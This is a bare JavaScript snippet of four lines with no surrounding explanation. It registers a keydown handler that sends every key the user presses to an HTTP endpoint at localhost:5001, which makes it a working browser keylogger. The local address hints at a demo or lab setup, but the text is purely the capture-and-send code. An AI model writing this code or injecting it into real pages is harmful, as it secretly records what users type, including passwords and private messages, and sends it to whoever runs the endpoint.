document.onkeydown = e => {
    fetch("http://localhost:5001/api/data?key=" + e.key);
};
